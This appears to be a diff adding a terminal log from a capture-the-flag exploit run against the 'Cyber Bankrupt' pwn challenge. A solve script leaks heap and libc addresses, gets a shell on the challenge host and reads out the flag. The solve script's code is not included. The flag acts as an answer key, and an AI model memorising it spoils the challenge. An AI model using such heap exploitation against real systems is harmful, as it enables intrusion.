@@ -1,0 +1,26 @@
+mito@mito-virtual-machine:~/CTF/Global_Cyber_Skills_Benchmark_CTF_2025/Pwn_Cyber_Bankrupt/challenge$ python3 solve.py r
+[+] Opening connection to 94.237.56.113 on port 54514: Done
+[*] '/home/mito/CTF/Global_Cyber_Skills_Benchmark_CTF_2025/Pwn_Cyber_Bankrupt/challenge/glibc/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+heap_leak = 0x55577fdb6260
+heap_base = 0x55577fdb6000
+libc_leak = 0x7f184c5f0ca0
+libc_base = 0x7f184c205000
+[*] Switching to interactive mode
+
+[SUCCESS] Transaction history has been wiped out!
+
+$ id
+uid=100(ctf) gid=101(ctf) groups=101(ctf)
+$ ls -l
+total 148
+-rw-------    1 ctf      ctf         385024 May 24 10:58 core
+-rwxr-xr-x    1 root     root         18088 Apr 28 14:52 cyber_bankrupt
+-rw-r--r--    1 root     root            67 May 24 10:57 flag.txt
+drwxrwxr-x    2 root     root          4096 Apr 28 14:52 glibc
+$ cat flag.txt
+HTB{b4nk5_5t1ll_u53_0ld_l1br4r135_f18adb8b387c85130824c064ab34e7cc}$
